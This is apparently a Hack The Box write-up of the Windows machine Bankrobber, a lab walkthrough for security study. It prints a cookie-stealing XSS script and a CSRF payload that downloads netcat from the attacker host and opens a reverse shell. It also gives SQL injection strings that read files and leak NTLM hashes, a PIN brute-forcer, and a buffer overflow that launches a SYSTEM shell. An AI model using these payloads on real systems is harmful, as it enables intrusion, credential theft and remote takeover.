---
title: HTB: Bankrobber
url: https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html
date: 2020-03-07T14:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, htb-bankrobber, hackthebox, nmap, mysql, smb, gobuster, cookies, xss, csrf, sqli, injection, bof, ida, chisel, python, pattern-create, phantom-js, reverse-engineering, htb-giddy, htb-querier, oscp-like-v2, oscp-like-v1
---

![Bankrobber](https://0xdfimages.gitlab.io/img/bankrobber-cover.png)

BankRobber was neat because it required exploiting the same exploit twice. I’ll find a XSS vulnerability that I can use to leak the admin user’s cookie, giving me access to the admin section of the site. From there, I’ll use a SQL injection to leak the source for one of the PHP pages which shows it can provide code execution, but only accepts requests from localhost. I’ll use the same XSS vulnerability to get the admin to send that request from Bankrobber, returning a shell. To privesc to SYSTEM, I’ll find a binary running as SYSTEM and listening only on localhost. I’m not able to grab a copy of the binary as my current user, but I can create a tunnel and poke at it directly. First I’ll brute force a 4-digit pin, and then I’ll discover a simple buffer overflow that allows me to overwrite a string that is the path to an executable that’s later run. I can overwrite that myself to get a shell. In Beyond Root, I’ll look at how the XSS was automated and at the executable now that I have access.

## Box Info

| Name | [Bankrobber](https://hackthebox.com/machines/bankrobber)  [Bankrobber](https://hackthebox.com/machines/bankrobber) [Play on HackTheBox](https://hackthebox.com/machines/bankrobber) |
| --- | --- |
| Release Date | [21 Sep 2019](https://twitter.com/hackthebox_eu/status/1174625681847832576) |
| Retire Date | 07 Mar 2020 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Bankrobber |
| Radar Graph | Radar chart for Bankrobber |
| First Blood User | 01:01:33[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 04:07:13[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| Creators | [Gioo Gioo](https://app.hackthebox.com/users/623)  [Cneeliz Cneeliz](https://app.hackthebox.com/users/3244) |

## Recon

### nmap

`nmap` shows four services, http (80), https (443), smb (445), and mysql (3306):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.154
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-21 15:02 EDT
Nmap scan report for 10.10.10.154
Host is up (0.36s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds

root@kali# nmap -p 80,443,445,3306 -sC -sV -oA scans/tcpscripts 10.10.10.154
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-21 15:03 EDT
Nmap scan report for 10.10.10.154                                                 
Host is up (0.044s latency).                                        
                    
PORT     STATE SERVICE      VERSION                                               
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin                     
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin                              
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1
...[snip]...
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m15s, deviation: 0s, median: 59m14s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-21 16:03:14
|_  start_date: 2019-09-21 16:01:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1401.01 seconds

```

For some reason the https scripts got stuck and took *forever*, spitting out a ton of `http/1.1`.

### MySQL - TCP 3306

I did some basic poking at MySQL, but couldn’t find anything useful. It requires a password to connect:

```

root@kali# mysql -h 10.10.10.154 --port 3306
ERROR 1130 (HY000): Host '10.10.14.5' is not allowed to connect to this MariaDB server

```

I guessed at a few usernames / passwords, but didn’t get anywhere.

### SMB - TCP 445

SMB was the same, locked down by a password:

```

root@kali# smbmap -H 10.10.10.154 -u 0xdf
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.154

root@kali# smbclient -N -L //10.10.10.154
session setup failed: NT_STATUS_ACCESS_DENIED

```

### Website - TCP 80/443

#### Site

The site is a Bitcoin (or E-coin?) wallet site:

![1569221162488](https://0xdfimages.gitlab.io/img/1569221162488.png)

I don’t have creds, but I can register and account. If I do so and submit, I’ll see the index page reload, with a small message at the top:

![1569221242392](https://0xdfimages.gitlab.io/img/1569221242392.png)

I can now login, and I’m at my account page, which has some balance, and a form to transfer E-coin to someone else:

![1569221452138](https://0xdfimages.gitlab.io/img/1569221452138.png)

When I put in an amount, and id number (1 seems like a safe bet), and a comment (like “test”), I get a pop up message:

![1569221530646](https://0xdfimages.gitlab.io/img/1569221530646.png)

#### Web Directory Brute

`gobuster` identifies two interesting paths, `/admin` and `/user`:

```

root@kali# gobuster dir -u http://10.10.10.154 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -o scans/gobuster_root                                        
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.154
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/21 15:07:34 Starting gobuster
===============================================================
/img (Status: 301)
/user (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/licenses (Status: 403)
/fonts (Status: 301)
/%20 (Status: 403)
/*checkout* (Status: 403)
/phpmyadmin (Status: 403)
/webalizer (Status: 403)
/*docroot* (Status: 403)
/* (Status: 403)
/con (Status: 403)
/http%3a (Status: 403)
/**http%3a (Status: 403)
/aux (Status: 403)
/*http%3a (Status: 403)
/%c0 (Status: 403)
===============================================================
2019/09/21 15:26:31 Finished
===============================================================

```

`/user/` is where I ended up on successful login. Trying to visit `/admin/` just returns:

```

You're not authorized to view this page

```

#### Requests

Once I log in, three cookies are set in the response:

```

HTTP/1.1 302 Found
Date: Mon, 23 Sep 2019 08:02:51 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Set-Cookie: id=3
Set-Cookie: username=MHhkZg%3D%3D
Set-Cookie: password=MHhkZg%3D%3D
Location: user
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

The `username` and `password` cookies are just the plaintext username and password, base64 and url encoded:

```

root@kali# echo MHhkZg== | base64 -d
0xdf

```

I’ll also notice in the POST to transfer E-coin that both the to and from ids are present, with no signing, which means I can modify them. The transfer of money seems to be rejected regardless right now, and I can’t see getting rich as the point here, so I’ll leave it for now.

## Shell as cortin

### XSS - admin Login

Given the note about the the admin reviewing the transaction, it seems like an opportunity for a cross-site scripting (XSS) attack. Both the amount and id fields only submit numeric values. I can confirm in Burp by trying to put text in, and seeing that the POST does still submit, but the invalid field is empty. Better client-side validation would prevent the POST from submitting at all.

I’ll test XSS in the comment field, and start my Python http server. I’ll start simple, with a couple tags to see if they connect back to me:

```

<img src="10.10.14.5/test.jpg" /> <script src="http://10.10.14.5/test.js"></script>

```
*A note about this XSS - it’s quite flaky. The times it takes to process, and if it processes at all varied greatly. I had good luck submitting a couple times, and if nothing came back after minute, logging out and back in, and trying again. Overall it was very frustrating to work on because it was so unreliable.*

Eventually, I see hits on my webserver for the script:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [21/Sep/2019 16:10:18] code 404, message File not found
10.10.10.154 - - [21/Sep/2019 16:10:18] "GET /test.js HTTP/1.1" 404 -

```

Perfect. It’s a bit off that the server is allowing plain script injection, but somehow isn’t loading images (hence the request for `test.js` and not `test.jpg`), but that is more likely an imperfection in the box author’s automation of the admin user than a hint (all of which is to say, were this a bug bounty or pentest, I would think differently about the result).

I’ll write a `cookie.js` with the following Javascript:

```

var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.5/?test='+document.cookie, true);
request.send()

```

Now I’ll submit again, this time with `cookie.js` in the `src`. Some number of submits and some minutes later:

```
10.10.10.154 - - [21/Sep/2019 17:18:54] "GET /cookie.js HTTP/1.1" 200 -
10.10.10.154 - - [21/Sep/2019 17:18:54] "GET /?test=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 - 

```

As I’ve seen that the cookies hold the username and password, I decode them:

```

root@kali# echo YWRtaW4= | base64 -d
admin
root@kali# echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d
Hopelessromantic

```

Now I can log out, and log back in with these creds. On login, this time I’m redirected to `/admin/`:

![1569303360624](https://0xdfimages.gitlab.io/img/1569303360624.png)

### /admin/ Enumeration

The `/admin/` page has additional links across the top, and three main sections where the transfer section had been on `/user/`.

#### notes.txt

The `NOTES.TXT` link leads to `/notes.txt`, which returns a text file:

```
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..

```

I’ll take two things from this:
- I can assume that the web directory is `C:\xampp\htdocs\` on Bankrobber.
- I’m not sure exactly what it means by encoding comments, but there’s definitely behavior that is different coming from localhost.

#### Transactions

Next I’ll see the “Transactions waiting for approval.” section. If I open a private browser session and log in as my user, and submit a transaction, I will see it here:

![1569303812747](https://0xdfimages.gitlab.io/img/1569303812747.png)

I took a look at the buttons, but they just reload `/admin/` with no further action. I’ll note that the XSS payload that worked against the admin isn’t working against me. This is likely another artifact of HTB. As a box maker, you don’t want the XSS firing against all the other HTB users who load the page. It isn’t that unrealistic anyway, as the admin could have a different interface to approve / deny transactions that could be vulnerable to different kinds of attacks.

#### Search Users

The “Search users (beta)” section allows me to search for a user id and get the name associated with it:

![1569304087785](https://0xdfimages.gitlab.io/img/1569304087785.png)

If I search for “1”, it does a POST to `/admin/search.php` with the payload `term=1`.

#### Backdoorcheker

The last section is Backdoorchecker, which says:

> ﻿To quickly identify backdoors located on our server;
> we implemented this function.
> For safety issues you’re only allowed to run the ‘dir’ command with any arguments.

It says it’s limited to the `dir` command, but I feel confident I can work around that and inject other commands. Unfortunately, running it is also limited to localhost:

![1569304377464](https://0xdfimages.gitlab.io/img/1569304377464.png)

At first I thought that might be local input filtering, but this does send a POST to `/admin/backdoorchecker.php` with the payload `cmd=dir`, and the response from the server is the message about localhost.

### SQLI - File Access

On playing with the users search, I quickly identified a potential SQLI:

![1569305049405](https://0xdfimages.gitlab.io/img/1569305049405.png)

Now I can access a lot of stuff. First, all the users:

![1569305169999](https://0xdfimages.gitlab.io/img/1569305169999.png)

Now I’ll try for a `UNION` injection. I’ll need to know how many columns. `SELECT 1` and `SELECT 1,2` returns errors, but `1,2,3` works:

![1569305297185](https://0xdfimages.gitlab.io/img/1569305297185.png)

There are three columns, and the value in 1 and 2 are returned to me. I can get the version and current user:

![1569305498542](https://0xdfimages.gitlab.io/img/1569305498542.png)

On enumerating the database using various commands ([this page](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) is a good reference), I didn’t find much of interest in the database. I did pull the hashes for authentication to MySQL with `10' UNION SELECT user,password,3 from mysql.user;-- -`:

![1569305663110](https://0xdfimages.gitlab.io/img/1569305663110.png)

I was unable to break this with hashcat.

I also successfully got a NetNTLMv2 hash for the user (just like in [Giddy](/2019/02/16/htb-giddy.html#get-net-ntlm) and [Querier](/2019/06/22/htb-querier.html#capture-net-ntlmv2)) by starting `responder` and submitting `term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- -`:

```

[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.154
[SMBv2] NTLMv2-SSP Username : BANKROBBER\Cortin
[SMBv2] NTLMv2-SSP Hash     : Cortin::BANKROBBER:8e03eb65c1ff7440:B6A365E18C306FF457C7B2E133E71AC6:0101000000000000C0653150DE09D201A9520A6CF259AB64000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000651BA4D76C8F5FB4DB2D21ED382782CB4FC0762AE6F5272B06ED51D958033E6C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
[*] Skipping previously captured hash for BANKROBBER\Cortin

```

I was also unable to break that with hashcat.

I could use this username and the sqli to grab `user.txt` (though I didn’t think of this when solving the box, props to shelly shocker for pointing this one out):

![1569306019082](https://0xdfimages.gitlab.io/img/1569306019082.png)

I did start to look at the source for the site, and specifically `/admin/backdoorchecker.php`, with the SQLI `10' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -`. I got the following source:

```

<?php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS
			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
				die("It's only allowed to use the $good command");
			}

			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?>

```

To use this function, my cookies must show the I’m admin with the correct hardcoded password. Next, it checks the command for `$(` and `&`, and fails if either are present. Next, as this is a Windows host, it checks that the first three characters of the command are `dir`. Finally, it checks that the remote address (the source of the request) is localhost, and if so, passes it to `system`.

### XSS + XSRF = Shell

I can easily escape the initial filters to run whatever I want using `;` or `|` to chain additional commands to `dir`. I need to figure out how to send my request from localhost.

This is where I can use the XSS. In a real life scenario, this server likely wouldn’t be restricting access to localhost, but rather the internal network, or even just the admin subnet of that network. And the admin wouldn’t be checking the submissions from the server, but from a box that would likely be able to submit to backdoorchecker. But I’ll hypothesize that in this case, the admin user is on Bankrobber, and thus can submit requests to backdoorchecker from there.

I’ll craft a Javascript payload that will issue the request to `/admin/backdoorchecker.php`, and call it `shell.js`:

```

var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);

```

This will get the admin user to make a request for me, which is a Cross-Site Request Forgery (XSRF) attack.

I’ll submit the XSS payload to get `shell.js` through my logged in user, and wait for the payload to fire.:

```

<script src="http://10.10.14.5/shell.js"></script>

```

When it does, I’ll see a GET for `shell.js`, which will run, and issuing a POST to `/admin/backdoorchecker.php` with the parameters `cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443`. This will pass all the checks in `backdoorchecker.php`, and pass that on to `system`, which will run the `dir`, followed by the `powershell` to download `nc64.exe` from my server, save it in `%temp%`. Then my commands have it run `nc` to connect back to me with a shell.

After a few minutes, that’s exactly what I see:

```
10.10.10.154 - - [22/Sep/2019 06:50:55] "GET /shell.js HTTP/1.1" 200 -
10.10.10.154 - - [22/Sep/2019 06:50:58] "GET /nc64.exe HTTP/1.1" 200 -

```

And then a shell on my waiting `nc` listener (always use `rlwrap` with windows):

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:52036.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\xampp\htdocs\admin>whoami
whoami
bankrobber\cortin

```

And now I can grab `user.txt` (if I didn’t grab it with sqli before):

```

C:\Users\Cortin\Desktop>type user.txt
f6353466************************

```

## Priv: cortin –> system

### Enumeration

The only thing I really found of interest on the filesystem was a binary at the drive root, `bankv2.exe`:

```

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C80C-B6D3

 Directory of C:\

25-04-2019  19:50            57.937 bankv2.exe
25-04-2019  00:27    <DIR>          PerfLogs
22-08-2019  20:04    <DIR>          Program Files
27-04-2019  16:02    <DIR>          Program Files (x86)
24-04-2019  18:52    <DIR>          Users
16-08-2019  17:29    <DIR>          Windows
25-04-2019  00:18    <DIR>          xampp
               1 File(s)         57.937 bytes
               6 Dir(s)  43.634.270.208 bytes free

```

Unfortunately, I can’t access it:

```

C:\>icacls bankv2.exe
icacls bankv2.exe
bankv2.exe: Toegang geweigerd.
Successfully processed 0 files; Failed processing 1 files

C:\>cacls bankv2.exe
cacls bankv2.exe
C:\bankv2.exe
Toegang geweigerd.

```

Google Translate tells me “Toegang geweigerd.” is “Access denied.” in Dutch.

After looking around the filesystem and not finding much, I eventually checked the `netstat` for listening ports:

```

C:\>netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       732
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1488
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1868
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1364
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       576
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       588
  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       1108
  TCP    [::]:135               [::]:0                 LISTENING       732
  TCP    [::]:443               [::]:0                 LISTENING       1108
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       1868
  TCP    [::]:49664             [::]:0                 LISTENING       456
  TCP    [::]:49665             [::]:0                 LISTENING       888
  TCP    [::]:49666             [::]:0                 LISTENING       840
  TCP    [::]:49667             [::]:0                 LISTENING       1364
  TCP    [::]:49668             [::]:0                 LISTENING       576
  TCP    [::]:49669             [::]:0                 LISTENING       588

```

910 jumped out at me as something I hadn’t seen in my initial `nmap`. It’s running with PID 1488, which is `bankv2.exe`:

```

C:\>tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
...[snip]...
bankv2.exe                    1488                            0        136 K
...[snip]...

```

I can use `nc` that I uploaded to talk to this port. When I connected, it hung for a moment, but when I hit enter, it continued:

```

C:\>%temp%\n.exe 127.0.0.1 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 

```

When I enter a pin at random, I get denied:

```

 [$] 1234
 [!] Access denied, disconnecting client....

```

### Tunnel

I’m going to script a brute force attack on the pin, but I don’t want to do that from Windows. I’ll create a tunnel using `chisel` (I’ve written a [post](/cheatsheets/chisel) about the awesomeness that is [Chisel](https://github.com/jpillora/chisel) before). With a copy of the amd65 compiled binary from the [release page](https://github.com/jpillora/chisel/releases) in my webserver directory, I’ll get it on Bankrobber in cortin’s temp directory:

```

C:\Users\Cortin\AppData\Local\Temp>powershell -c "wget 10.10.14.5/chisel_windows_amd64.exe -o c.exe"

```

It takes a minute to upload, and while it’s doing that, I’ll start the server on my box:

```

root@kali:/opt/chisel# ./chisel server -p 8000 --reverse
2019/09/24 03:17:12 server: Reverse tunnelling enabled
2019/09/24 03:17:12 server: Fingerprint 80:44:a6:92:c1:bb:c8:5f:64:b7:2e:34:2f:5e:56:05
2019/09/24 03:17:12 server: Listening on 0.0.0.0:8000...

```

Now `chisel` is listening on 8000, and will allow reverse tunnels, which is what I’ll create next:

```

C:\Users\Cortin\AppData\Local\Temp>c.exe client 10.10.14.5:8000 R:910:localhost:910
2019/09/24 10:21:04 client: Connecting to ws://10.10.14.5:8000
2019/09/24 10:21:05 client: Fingerprint 80:44:a6:92:c1:bb:c8:5f:64:b7:2e:34:2f:5e:56:05
2019/09/24 10:21:05 client: Connected (Latency 24.9252ms)

```

This will create a listener on my local box on port 910, which will forward traffic through chisel to localhost on Bankrobber port 910.

I see the connection on my server:

```

2019/09/24 03:21:50 server: proxy#1:R:0.0.0.0:910=>localhost:910: Listening

```

And I can test the tunnel with `nc`:

```

root@kali# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0000
 [!] Access denied, disconnecting client....

```

### Brute Force Pin

I’ll write a Python script to brute force the pin. It will use `socket` to connect to localhost:910, send the pin and a newline, and check for “Access denied” in the response. If it’s not there, It will print the pin and break. To make it a bit neater, I’ll add a line that prints the current number being tried, overwriting itself each time to not flood my screen:

```

#!/usr/bin/env python3

import socket
import sys

for i in range(10000):
    sys.stdout.write(f"\rTrying: {i:04d}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 910))
    s.recv(4096)
    s.send(f"{i:04d}\n".encode())
    resp = s.recv(4096)
    if not b"Access denied" in resp:
        print(f"\rFound pin: {i:04d}")
        break
    s.close()

```

When I run this, it finds the pin of 0021:

![](https://0xdfimages.gitlab.io/img/bankrobber-brute-pin.gif)

### Overflow

Now with the pin, I can look at the rest of the app:

```

root@kali# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 12 
 [$] Transfering $12 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...

```

It’s quite simple. If I enter an invalid string, it just say the same thing:

```

root@kali# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] abcd
 [$] Transfering $abcd using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...

```

When I enter a long string, I notice something weird:

```

root@kali# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

 [$] Transaction in progress, you can safely disconnect...

```

It seems to overflow the name of the executable that’s running. The name of the executable must be stored on the stack, and this overflow is overwriting it. I’ll examine the binary in [Beyond Root](#bankv2exe). I can use `msf-pattern_create` to get a pattern and submit it as the amount:

```

root@kali# msf-pattern_create -l 40
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A

root@kali# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2A

 [$] Transaction in progress, you can safely disconnect...

```

Now I can submit the first four bytes to `msf-pattern_offset` and get the offset:

```

root@kali# msf-pattern_offset -q 0Ab1
[*] Exact match at offset 32

```

I already have `nc` located at `\Users\Cortin\AppData\Local\Temp\n.exe`. I’ll try to overwrite the call with that. I’ll create a payload:

```

root@kali# python -c 'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.14.5 443"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 443

```

Now, with a `nc` listening waiting, I’ll submit it:

```

root@kali# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 443
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 443 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: \Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 443

 [$] Transaction in progress, you can safely disconnect...

```

The transfer tool looks right. And I have a shell as system:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:50224.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\Windows\system32>whoami
whoami
nt authority\system

```

From there, I can grab `root.txt`:

```

C:\Users\admin\Desktop>type root.txt
aa65d8e6************************

```

## Beyond Root

### Admin request

I always like to check out how creators script user activity. I’ll check out the scheduled tasks:

```

C:\Users\admin\Desktop>schtasks /query                                    
...[snip]...
Folder: \bankrobber                                                            
TaskName                                 Next Run Time          Status  
======================================== ====================== ===============
Admin request                            24-9-2019 11:06:05     Ready          
bankapp                                  N/A                    Running        
Kill hanging phantom                     24-9-2019 11:06:50     Ready          
Truncate comments                        24-9-2019 11:06:14     Ready          
XAMPP start on boot                      N/A                    Running
...[snip]...

```

I’ll grab the details for “Admin request”:

```

C:\Users\admin\Desktop>schtasks /query /TN "bankrobber\admin request" /v /FO list

Folder: bankrobber
HostName:                             BANKROBBER
TaskName:                             bankrobber\admin request
Next Run Time:                        24-9-2019 11:10:05
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        24-9-2019 11:07:08
Last Result:                          0
Author:                               DESKTOP-62OTOFV\admin
Task To Run:                          C:\Users\admin\Documents\phantomjs\bin\phantomjs.exe C:\Users\admin\Documents\phantomjs\bin\get.js
Start In:                             N/A
Comment:                              Simulate an admin request with PhantomJS
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          admin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily 
Start Time:                           17:06:05
Start Date:                           16-8-2019
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
